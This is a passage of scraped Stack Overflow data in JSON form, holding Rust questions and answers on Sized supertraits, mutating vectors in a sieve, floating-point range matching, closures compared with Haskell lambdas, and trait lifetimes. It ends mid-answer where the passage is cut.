[{"tags": ["rust", "traits"], "answers": [{"comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519851545, "post_id": 49038431, "comment_id": 85082054, "body": "This is probably a duplicate, but I haven&#39;t found it yet. Let me know and I&#39;ll delete this and close as duplicate."}, {"owner": {"reputation": 355, "user_id": 5955876, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5b29bb86b71b9c789283bd5180355d5c?s=128&d=identicon&r=PG&f=1", "display_name": "Count Zero", "link": "https://stackoverflow.com/users/5955876/count-zero"}, "edited": false, "score": 0, "creation_date": 1519851858, "post_id": 49038431, "comment_id": 85082229, "body": "I couldn&#39;t find it either, so thank you!"}], "tags": [], "owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "is_accepted": true, "score": 5, "last_activity_date": 1519851519, "creation_date": 1519851519, "answer_id": 49038431, "question_id": 49038394, "link": "https://stackoverflow.com/questions/49038394/a-trait-with-a-sized-supertrait-still-has-the-error-stdmarkersized-is-not-s/49038431#49038431", "title": "A trait with a Sized supertrait still has the error &quot;std::marker::Sized is not satisfied&quot;", "body": "<blockquote>\n  <p>because I've marked my trait <code>T</code> as <code>Sized</code></p>\n</blockquote>\n\n<p>No, you haven't. You've said that any type <em>that implements <code>T</code></em> must be <code>Sized</code>. The <em>trait</em> itself is still unsized. You either need a trait object (e.g. <code>Box&lt;T&gt;</code>) or some kind of generic (which you cannot do in this context).</p>\n"}], "owner": {"reputation": 355, "user_id": 5955876, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5b29bb86b71b9c789283bd5180355d5c?s=128&d=identicon&r=PG&f=1", "display_name": "Count Zero", "link": "https://stackoverflow.com/users/5955876/count-zero"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 137, "favorite_count": 0, "closed_date": 1519870872, "accepted_answer_id": 49038431, "answer_count": 1, "score": 3, "last_activity_date": 1519851617, "creation_date": 1519851362, "last_edit_date": 1519851617, "question_id": 49038394, "link": "https://stackoverflow.com/questions/49038394/a-trait-with-a-sized-supertrait-still-has-the-error-stdmarkersized-is-not-s", "closed_reason": "Duplicate", "title": "A trait with a Sized supertrait still has the error &quot;std::marker::Sized is not satisfied&quot;", "body": "<p>I have the following code:</p>\n\n<pre><code>use std::collections::HashMap;\n\ntrait T: Sized {}\n\nstruct A;\n\nimpl T for A {}\n\nfn main() {\n    let h: HashMap&lt;String, T&gt;;\n}\n</code></pre>\n\n<p>But the compiler complains:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0277]: the trait bound `T: std::marker::Sized` is not satisfied\n  --&gt; src\\main.rs:10:12\n   |\n10 |     let h: HashMap&lt;String, T&gt;;\n   |            ^^^^^^^^^^^^^^^^^^ `T` does not have a constant size known at compile-time\n   |\n   = help: the trait `std::marker::Sized` is not implemented for `T`\n   = note: required by `std::collections::HashMap`\n\nerror[E0038]: the trait `T` cannot be made into an object\n  --&gt; src\\main.rs:10:12\n   |\n10 |     let h: HashMap&lt;String, T&gt;;\n   |            ^^^^^^^^^^^^^^^^^^ the trait `T` cannot be made into an object\n   |\n   = note: the trait cannot require that `Self : Sized`\n</code></pre>\n\n<p>I don't understand the error messages, because I've marked my trait <code>T</code> as <code>Sized</code>. Am I missing something?</p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519849085, "post_id": 49037703, "comment_id": 85080793, "body": "Yes, it is idiomatic. There are also times where it is not."}, {"owner": {"reputation": 3448, "user_id": 5013141, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4cf3ceda840c5913990ed58fa55fa56f?s=128&d=identicon&r=PG&f=1", "display_name": "Michael Fulton", "link": "https://stackoverflow.com/users/5013141/michael-fulton"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519849213, "post_id": 49037703, "comment_id": 85080847, "body": "Thank you, at least I know I am on the right track. I also realize I am hoping for more information related to my problem so I will modify the question"}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519849414, "post_id": 49037703, "comment_id": 85080958, "body": "<code>let mut v = vec![1, 2, 3]; v[0] = 42;</code> (Yes, I know it seems like I&#39;m being obtuse, but I&#39;m trying to see if I can figure out the real underlying question here)."}, {"owner": {"reputation": 2966, "user_id": 3022310, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/7f10ec2b45320ee843e539d705c31d08?s=128&d=identicon&r=PG", "display_name": "turbulencetoo", "link": "https://stackoverflow.com/users/3022310/turbulencetoo"}, "edited": false, "score": 2, "creation_date": 1519858059, "post_id": 49037703, "comment_id": 85085165, "body": "I think the important question from the OP is <i>&quot;My thinking is that the vector is immutable (the data types and size of the vector will never change) but the contents of the vector should be mutable references to integers. Or should they be the actual values of the integers themselves (and not references)?&quot;</i> I feel like your first line of thinking is rather strange, and your second option (the vec contains integers) is what most of us would do."}], "answers": [{"comments": [{"owner": {"reputation": 3448, "user_id": 5013141, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4cf3ceda840c5913990ed58fa55fa56f?s=128&d=identicon&r=PG&f=1", "display_name": "Michael Fulton", "link": "https://stackoverflow.com/users/5013141/michael-fulton"}, "edited": false, "score": 0, "creation_date": 1519929535, "post_id": 49041877, "comment_id": 85117598, "body": "Thank you for the thoughtful answer. This clears up multiple misunderstandings I had, especially the part about mutable vectors vs. immutable vector with mutable references."}], "tags": [], "owner": {"reputation": 46065, "user_id": 234590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/463c0219a51a5d1fd08e1fa280811b57?s=128&d=identicon&r=PG", "display_name": "Francis Gagn&#233;", "link": "https://stackoverflow.com/users/234590/francis-gagn%c3%a9"}, "is_accepted": true, "score": 8, "last_activity_date": 1519872690, "creation_date": 1519872690, "answer_id": 49041877, "question_id": 49037703, "link": "https://stackoverflow.com/questions/49037703/how-can-i-modify-elements-of-a-vector-in-place-in-rust/49041877#49041877", "title": "How can I modify elements of a vector in place in Rust?", "body": "<blockquote>\n  <p>My thinking is that the vector is immutable (the data types and size of the vector will never change) but the contents of the vector should be mutable references to integers. Or should they be the actual values of the integers themselves (and not references)?</p>\n</blockquote>\n\n<p>References (<code>&amp;'a T</code> and <code>&amp;'a mut T</code>) can only refer to values that are <em>owned</em> by another value. References cannot own their referent.</p>\n\n<p>It might be a good idea to build a vector of references to integers if you want to have a function that operates on some integers of a collection that are not necessarily contiguous. However, based on your code sample, that does not appear to be the case; it will be much simpler and much easier for the vector to own the integers. That means that the vector itself will need to be mutable. However, if you want to ensure that a function doesn't try to change the size of a vector, that function can accept a mutable slice of integers <code>&amp;mut [usize]</code>, rather than a mutable reference to the vector (<code>&amp;mut Vec&lt;usize&gt;</code>).</p>\n\n<blockquote>\n  <p>In Rust, is it more idiomatic to create a copy of a potentially huge <code>Vec</code>, operate on that, and return it?</p>\n</blockquote>\n\n<p>It depends on whether you need to use the original <code>Vec</code> again afterwards. If you don't, then it's more efficient to mutate the <code>Vec</code> in-place. If you only need to keep the original <code>Vec</code> in some cases and not in others, you can always <code>clone()</code> the <code>Vec</code> beforehand. If you do need the original <code>Vec</code> every time, then it may be more efficient to return a new <code>Vec</code>, especially if you can fill it from an iterator using <a href=\"https://doc.rust-lang.org/stable/std/iter/trait.Iterator.html#method.collect\" rel=\"noreferrer\"><code>collect</code></a>, since that will try to allocate the right size ahead of time and only assign each value in the <code>Vec</code> once.</p>\n\n<hr>\n\n<p>Considering all this, here's how I would write your code. Notice that I had to change the main loop in <code>sieve</code> to not directly iterate over <code>nums</code>, because that lead to a borrow conflict \u2013 the <code>for</code> loop needed a borrow on <code>nums</code>, but the assignment <code>nums[x]</code> would also try to take a mutable borrow on <code>nums</code> while the other borrow is active. I also changed the <code>&amp;usize</code> parameters to <code>usize</code>, because there is no benefit to using references for small, copyable types such as primitive integers (in fact, it may be slightly slower).</p>\n\n<pre><code>#![feature(iterator_step_by)]\n\npub fn nth(n: usize) {\n    let size: usize = (2.0 * n as f64 * (n as f64).ln()) as usize;\n    // Set an upper bound for seiving.\n    let size_sqrt: usize = (size as f64).sqrt().ceil() as usize;\n    let mut nums: Vec&lt;usize&gt; = vec![0; size];\n    sieve(&amp;mut nums, size, size_sqrt);\n}\n\nfn sieve(nums: &amp;mut [usize], size: usize, size_sqrt: usize) {\n    for i in 0..size {\n        nums[i] = i;\n    }\n\n    for i in 0..size {\n        let num = nums[i];\n        if num &lt; 2 {\n            continue;\n        }\n\n        if num &gt; size_sqrt {\n            break;\n        }\n\n        for x in (num.pow(2)..size).step_by(num) {\n            nums[x] = 0;\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 3448, "user_id": 5013141, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4cf3ceda840c5913990ed58fa55fa56f?s=128&d=identicon&r=PG&f=1", "display_name": "Michael Fulton", "link": "https://stackoverflow.com/users/5013141/michael-fulton"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7735, "favorite_count": 1, "accepted_answer_id": 49041877, "answer_count": 1, "score": 3, "last_activity_date": 1519872690, "creation_date": 1519848444, "last_edit_date": 1519849280, "question_id": 49037703, "link": "https://stackoverflow.com/questions/49037703/how-can-i-modify-elements-of-a-vector-in-place-in-rust", "title": "How can I modify elements of a vector in place in Rust?", "body": "<p>I am trying to pass an immutable reference to a <code>Vec</code> (a slice) to a function which will fill the <code>Vec</code> with incrementing values, and then iterate over them again replacing some of those values with zeroes.</p>\n\n<p>My thinking is that the vector is immutable (the data types and size of the vector will never change) but the contents of the vector should be mutable references to integers. Or should they be the actual values of the integers themselves (and not references)?</p>\n\n<p>This have proven a difficult task.. I've read about mutability and borrowing, and I feel I have an OK understanding of this. I also have a cursory understanding of how referencing, dereferencing, pointers, etc. work in C, but I think I am struggling with the syntax of Rust to achieve this.</p>\n\n<p>Am I thinking about this the wrong way? In Rust, is it more idiomatic to create a copy of a potentially huge <code>Vec</code>, operate on that, and return it?</p>\n\n<p>This is my code so far (does not compile, many errors):</p>\n\n<pre><code>#![feature(iterator_step_by)]\n\npub fn nth(n: usize) {\n    let size: usize = (2 as f64 * n as f64 * (n as f64).ln()) as usize;\n    // Set an upper bound for seiving.\n    let size_sqrt: usize = (size as f64).sqrt().ceil() as usize;\n    let nums: Vec&lt;&amp;mut usize&gt; = Vec::with_capacity(size);\n    sieve(nums, &amp;size, &amp;size_sqrt);\n}\n\nfn sieve(nums: [&amp;mut usize], size: &amp;usize, size_sqrt: &amp;usize) {\n    for i in 0..*size {\n        nums[i] = i;\n    }\n    for num in nums {\n        if num &lt; 2 {\n            continue;\n        } else if num &gt; *size_sqrt {\n            break;\n        }\n        for x in (num.pow(2)..size).step_by(*num) {\n            nums[x] = 0;\n        }\n    }\n}\n</code></pre>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 1, "creation_date": 1519848228, "post_id": 49037111, "comment_id": 85080334, "body": "If your ranges are all contiguous, omitting the lower bound keeps things pretty readable: <a href=\"https://play.rust-lang.org/?gist=02d45de79815a37567cfdd59bd07ca18&amp;version=stable\" rel=\"nofollow noreferrer\">play.rust-lang.org/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 2569, "user_id": 2029668, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e013232c8e8539be34c51834c974fec1?s=128&d=identicon&r=PG", "display_name": "couchand", "link": "https://stackoverflow.com/users/2029668/couchand"}, "edited": false, "score": 0, "creation_date": 1519847567, "post_id": 49037357, "comment_id": 85079989, "body": "Nice idea.  I&#39;m assuming that should be <code>impl InRange for f32</code>?"}, {"owner": {"reputation": 2569, "user_id": 2029668, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e013232c8e8539be34c51834c974fec1?s=128&d=identicon&r=PG", "display_name": "couchand", "link": "https://stackoverflow.com/users/2029668/couchand"}, "edited": false, "score": 1, "creation_date": 1519879478, "post_id": 49037357, "comment_id": 85090596, "body": "even better: <code>impl&lt;T: PartialOrd&gt; InRange for T { ... }</code>!"}, {"owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "reply_to_user": {"reputation": 2569, "user_id": 2029668, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e013232c8e8539be34c51834c974fec1?s=128&d=identicon&r=PG", "display_name": "couchand", "link": "https://stackoverflow.com/users/2029668/couchand"}, "edited": false, "score": 1, "creation_date": 1519891948, "post_id": 49037357, "comment_id": 85095047, "body": "@couchand: Pedantically, that would be logically invalid, as <code>PartialOrd</code> doesn&#39;t guarantee that ranges even make sense in the first place.  The constraint you want there is <code>Ord</code>, but that would exclude floats due to NaN.  IEEE Floating Point: because we can&#39;t have nice things."}, {"owner": {"reputation": 671, "user_id": 8814732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fce9ee6d3e64c2900b3b81d439c7ec2?s=128&d=identicon&r=PG&f=1", "display_name": "Sergey Ronin", "link": "https://stackoverflow.com/users/8814732/sergey-ronin"}, "edited": false, "score": 0, "creation_date": 1568237339, "post_id": 49037357, "comment_id": 102215100, "body": "Could you explain why you are dereferencing <code>self</code> in the implementation of <code>InRange</code> for <code>f32</code>?"}, {"owner": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "reply_to_user": {"reputation": 671, "user_id": 8814732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fce9ee6d3e64c2900b3b81d439c7ec2?s=128&d=identicon&r=PG&f=1", "display_name": "Sergey Ronin", "link": "https://stackoverflow.com/users/8814732/sergey-ronin"}, "edited": false, "score": 0, "creation_date": 1568279045, "post_id": 49037357, "comment_id": 102226625, "body": "@KomronAripov The numeric operators are only implemented for <code>f32</code> and <code>f32</code> or <code>&amp;f32</code> and <code>&amp;f32</code>. Try to remove the dereference operator, and you&#39;ll see that the snippet doesn&#39;t compile anymore."}], "tags": [], "owner": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "is_accepted": true, "score": 9, "last_activity_date": 1571314461, "last_edit_date": 1571314461, "creation_date": 1519846884, "answer_id": 49037357, "question_id": 49037111, "link": "https://stackoverflow.com/questions/49037111/alternatives-to-matching-floating-point-ranges/49037357#49037357", "title": "Alternatives to matching floating point ranges", "body": "<p>I would personally do this:</p>\n\n<pre><code>#[derive(Debug, PartialEq)]\nenum Color {\n    Red,\n    Yellow,\n    Blue,\n    Grey,\n}\n\ntrait InRange {\n    fn in_range(self, begin: Self, end: Self) -&gt; bool;\n}\n\nimpl InRange for f32 {\n    fn in_range(self, begin: f32, end: f32) -&gt; bool {\n        self &gt;= begin &amp;&amp; self &lt; end\n    }\n}\n\nimpl From&lt;f32&gt; for Color {\n    fn from(f: f32) -&gt; Color {\n        match f {\n            x if x.in_range(0.0, 0.1) =&gt; Color::Red,\n            x if x.in_range(0.1, 0.4) =&gt; Color::Yellow,\n            x if x.in_range(0.4, 0.8) =&gt; Color::Blue,\n            _ =&gt; Color::Grey,\n        }\n    }\n}\n\nfn main() {\n    assert_eq!(Color::from(0.2), Color::Yellow);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 17608, "user_id": 3650362, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Fqdi1.jpg?s=128&g=1", "display_name": "trentcl", "link": "https://stackoverflow.com/users/3650362/trentcl"}, "is_accepted": false, "score": 10, "last_activity_date": 1603220439, "last_edit_date": 1603220439, "creation_date": 1571320994, "answer_id": 58434531, "question_id": 49037111, "link": "https://stackoverflow.com/questions/49037111/alternatives-to-matching-floating-point-ranges/58434531#58434531", "title": "Alternatives to matching floating point ranges", "body": "<p>Since Rust 1.35, the <code>InRange</code> functionality <a href=\"https://stackoverflow.com/a/49037357/3650362\">implemented by Boiethios</a> is already provided in the <a href=\"https://doc.rust-lang.org/std/ops/struct.Range.html#method.contains\" rel=\"nofollow noreferrer\"><code>contains</code></a> method on <code>Range&lt;f32&gt;</code>:</p>\n<pre><code>impl From&lt;f32&gt; for Color {\n    fn from(f: f32) -&gt; Color {\n        match f {\n            x if (0.0..0.1).contains(&amp;x) =&gt; Color::Red,\n            x if (0.1..0.4).contains(&amp;x) =&gt; Color::Yellow,\n            x if (0.4..0.8).contains(&amp;x) =&gt; Color::Blue,\n            _ =&gt; Color::Grey,\n        }\n    }\n}\n</code></pre>\n<p>However, I would tend to write this with only one comparison against each number, which reduces the chance of typos introducing bugs:</p>\n<pre><code>impl From&lt;f32&gt; for Color {\n    fn from(f: f32) -&gt; Color {\n        match f {\n            x if x &lt; 0.0 =&gt; Color::Grey;\n            x if x &lt; 0.1 =&gt; Color::Red,\n            x if x &lt; 0.4 =&gt; Color::Yellow,\n            x if x &lt; 0.8 =&gt; Color::Blue,\n            _ =&gt; Color::Grey,\n        }\n    }\n}\n</code></pre>\n<p>This style also makes it more obvious that there are two disjoint ranges that return <code>Color::Grey</code>: <code>x &lt; 0.0</code> and <code>x &gt;= 0.8</code>.</p>\n<h2>See also</h2>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/28265036/how-can-i-test-if-a-value-lies-within-a-range\">How can I test if a value lies within a Range?</a></li>\n</ul>\n"}], "owner": {"reputation": 2569, "user_id": 2029668, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e013232c8e8539be34c51834c974fec1?s=128&d=identicon&r=PG", "display_name": "couchand", "link": "https://stackoverflow.com/users/2029668/couchand"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1175, "favorite_count": 0, "accepted_answer_id": 49037357, "answer_count": 2, "score": 12, "last_activity_date": 1603220439, "creation_date": 1519845905, "question_id": 49037111, "link": "https://stackoverflow.com/questions/49037111/alternatives-to-matching-floating-point-ranges", "title": "Alternatives to matching floating point ranges", "body": "<p>What's the best way to write a series of floating point range comparisons?  To use the example from the GitHub comment below,</p>\n\n<pre><code>let color = match foo {\n    0.0...0.1 =&gt; Color::Red,\n    0.1...0.4 =&gt; Color::Yellow,\n    0.4...0.8 =&gt; Color::Blue,\n    _         =&gt; Color::Grey,\n};\n</code></pre>\n\n<p>The naive solution would be a painful if-else chain:</p>\n\n<pre><code>let color = {\n    if 0.0 &lt;= foo &amp;&amp; foo &lt; 0.1 {\n        Color::Red\n    }\n    else if 0.1 &lt;= foo &amp;&amp; foo &lt; 0.4 {\n        Color::Yellow\n    }\n    else if 0.4 &lt;= foo &amp;&amp; foo &lt; 0.8 {\n        Color:: Blue\n    }\n    else {\n        Color::Grey\n    }\n}\n</code></pre>\n\n<p>Is that really the best option available?  There must be a nicer way to write this, right?</p>\n\n<hr>\n\n<p>Related to <a href=\"https://stackoverflow.com/questions/45875142/alternatives-to-matching-floating-points\">Alternatives to matching floating points</a>, but this is for range comparisons.</p>\n\n<p>Originally mentioned in <a href=\"https://github.com/rust-lang/rust/issues/41620#issuecomment-303333591\" rel=\"noreferrer\">the tracking issue</a> for <code>illegal_floating_point_literal_pattern</code>, and something I'm running into constantly.</p>\n"}, {"tags": ["haskell", "lambda", "rust", "closures"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 1, "creation_date": 1519843958, "post_id": 49036486, "comment_id": 85078078, "body": "Does Haskell monomorphize their closures? I know there&#39;s some aspects around stream fusion..."}, {"owner": {"user_type": "does_not_exist", "display_name": "user8370684"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519844532, "post_id": 49036486, "comment_id": 85078408, "body": "@Shepmaster I am not an expert in Haskell, and only a beginner in Rust, which is why I&#39;d like to know."}, {"owner": {"reputation": 126907, "user_id": 791604, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ce991df7a056248d5e4f6fc3659ba733?s=128&d=identicon&r=PG", "display_name": "Daniel Wagner", "link": "https://stackoverflow.com/users/791604/daniel-wagner"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 3, "creation_date": 1519846658, "post_id": 49036486, "comment_id": 85079555, "body": "@Shepmaster No, Haskell closures are no more monomorphic than they need to be (with one occasionally annoying exception for top-level definitions, the monomorphism restriction, and even that can be turned off with a compiler flag)."}], "answers": [{"comments": [{"owner": {"reputation": 100892, "user_id": 745903, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/50933f6638836741e620669b3940410e?s=128&d=identicon&r=PG", "display_name": "leftaroundabout", "link": "https://stackoverflow.com/users/745903/leftaroundabout"}, "edited": false, "score": 1, "creation_date": 1519901123, "post_id": 49037129, "comment_id": 85100172, "body": "FTR, Haskell lambdas can very often be inlined too. It just usually requires that the higher-order function you <i>pass</i> the lambda to is inlined first, which can be a bit of a code bloat (but this is actually quite similar to what C++ and Rust do when instantiating templates over a lambda&#39;s type)."}], "tags": [], "owner": {"reputation": 99643, "user_id": 445517, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/57e2ba76e6290c4e9e19821a068bc8c1?s=128&d=identicon&r=PG", "display_name": "CodesInChaos", "link": "https://stackoverflow.com/users/445517/codesinchaos"}, "is_accepted": true, "score": 12, "last_activity_date": 1519845977, "creation_date": 1519845977, "answer_id": 49037129, "question_id": 49036486, "link": "https://stackoverflow.com/questions/49036486/what-is-the-difference-between-a-rust-closure-and-a-haskell-lambda/49037129#49037129", "title": "What is the difference between a Rust closure and a Haskell lambda?", "body": "<p>Rust's choice of using distinct types has two performance benefits:</p>\n\n<ul>\n<li>The compiler can stack allocate the data you close over (or embed it into the containing data structure)</li>\n<li>Since it knows which function the closure references at compile time it can statically dispatch the call and even inline the call.</li>\n</ul>\n\n<p>You can also choose to use <code>Box&lt;Fn&gt;</code> instead. That costs a heap allocation and results in an indirect call, but in exchange there is only one type per signature.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8370684"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 576, "favorite_count": 1, "closed_date": 1519919544, "accepted_answer_id": 49037129, "answer_count": 1, "score": 14, "last_activity_date": 1519845977, "creation_date": 1519843505, "question_id": 49036486, "link": "https://stackoverflow.com/questions/49036486/what-is-the-difference-between-a-rust-closure-and-a-haskell-lambda", "closed_reason": "Needs more focus", "title": "What is the difference between a Rust closure and a Haskell lambda?", "body": "<p>Recently I <a href=\"https://stackoverflow.com/questions/49012277/how-to-create-a-vector-of-boxed-closures-in-rust\">asked</a> about how to put a bunch of closures with the same signature into a vector in Rust. Coming from a Haskell background, it seemed a bit complicated, with Rust closures each having their own unique types and needing a trait to represent them. In Haskell, a lambda is typed by its signature and if the signature is the same, the type is the same. </p>\n\n<p>Is there a semantic difference between a Rust closure and a Haskell lambda function that makes for these differences?</p>\n"}, {"tags": ["rust", "traits"], "comments": [{"owner": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 4, "creation_date": 1519836881, "post_id": 49034550, "comment_id": 85074231, "body": "Code <a href=\"https://play.rust-lang.org/?gist=0e801506756e468e1de4dd52640a65e9&amp;version=nightly\" rel=\"nofollow noreferrer\">compiles</a> with <a href=\"https://github.com/rust-lang/rfcs/blob/master/text/2094-nll.md\" rel=\"nofollow noreferrer\"><i>non lexical lifetimes</i></a> <code>#![feature(nll)]</code>"}, {"owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "edited": false, "score": 0, "creation_date": 1519854651, "post_id": 49034550, "comment_id": 85083701, "body": "Yep, the core difference seems to be that NLL permits a reference which refers to data that does not outlive the reference. <code>fn f&lt;&#39;a, &#39;b&gt;() { let _: &amp;&#39;a &amp;&#39;b (); }</code>"}, {"owner": {"reputation": 46065, "user_id": 234590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/463c0219a51a5d1fd08e1fa280811b57?s=128&d=identicon&r=PG", "display_name": "Francis Gagn&#233;", "link": "https://stackoverflow.com/users/234590/francis-gagn%c3%a9"}, "edited": false, "score": 1, "creation_date": 1519868847, "post_id": 49034550, "comment_id": 85088065, "body": "If you use <a href=\"https://play.rust-lang.org/?gist=6494513303d5d5750da37eb80c721fb5&amp;version=stable\" rel=\"nofollow noreferrer\">an associated type instead of a type parameter</a>, then it compiles. Unless there is a reason that a single type should be able to implement multiple instances of the <code>BTree</code> trait, I suggest you use the associated type version instead. This way, when you write generic functions using <code>BTree</code>, you won&#39;t need an additional type parameter for <code>BTree</code>&#39;s <code>T</code>."}, {"owner": {"reputation": 1523, "user_id": 1235487, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c586f2d0682c9f919da29b520347a5e?s=128&d=identicon&r=PG", "display_name": "Pierre-Antoine", "link": "https://stackoverflow.com/users/1235487/pierre-antoine"}, "reply_to_user": {"reputation": 46065, "user_id": 234590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/463c0219a51a5d1fd08e1fa280811b57?s=128&d=identicon&r=PG", "display_name": "Francis Gagn&#233;", "link": "https://stackoverflow.com/users/234590/francis-gagn%c3%a9"}, "edited": false, "score": 0, "creation_date": 1519912034, "post_id": 49034550, "comment_id": 85106495, "body": "@FrancisGagn&#233; You are right, an associated type is probably better here; I&#39;m still not very good at choosing between those and type parameters. Thanks for pointing that out. That being said, it is not clear to me why an associated type does no have the same lifetime problem as type parameters... :-/"}], "answers": [{"comments": [{"owner": {"reputation": 1523, "user_id": 1235487, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c586f2d0682c9f919da29b520347a5e?s=128&d=identicon&r=PG", "display_name": "Pierre-Antoine", "link": "https://stackoverflow.com/users/1235487/pierre-antoine"}, "edited": false, "score": 1, "creation_date": 1519843551, "post_id": 49035172, "comment_id": 85077869, "body": "Thanks a lot for this detailed explanation. Things are getting clearer for me. Indeed, I overlooked the fact that traits can be implemented by many things, including borrowed types! Rust is scaringly awesome :)"}], "tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": true, "score": 11, "last_activity_date": 1519841252, "last_edit_date": 1519841252, "creation_date": 1519838250, "answer_id": 49035172, "question_id": 49034550, "link": "https://stackoverflow.com/questions/49034550/why-does-a-function-body-compile-in-a-struct-but-not-in-a-trait/49035172#49035172", "title": "Why does a function body compile in a struct, but not in a trait?", "body": "<blockquote>\n  <p>How come this problem occurs in the trait, but not in its implementation for MyBTree?</p>\n</blockquote>\n\n<p>These method signatures become more nuanced when you consider implementing 